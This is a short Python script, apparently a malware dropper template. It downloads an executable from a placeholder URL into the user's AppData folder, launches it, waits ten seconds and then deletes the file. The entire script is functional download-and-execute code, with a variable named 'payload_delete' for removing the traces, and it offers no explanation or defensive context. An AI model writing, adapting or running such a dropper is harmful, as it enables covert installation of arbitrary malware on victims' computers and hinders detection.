import requests
import os
import time
download_url = 'put url here'
download_name = 'filename.exe'
payload_delete = True
appdata = os.path.join(os.path.join(os.environ['USERPROFILE']), 'AppData')
pathname = os.path.join(appdata, download_name)

def download():
    r = requests.get(download_url, allow_redirects=True)
    open(pathname, 'wb').write(r.content)
    start()
    
def start():
    command = ('start ' + pathname)
    os.system(command);
    time.sleep(10)
    delete()

def delete():
    if payload_delete == True:
        command = ('del ' + pathname)
        os.system(command)

download()

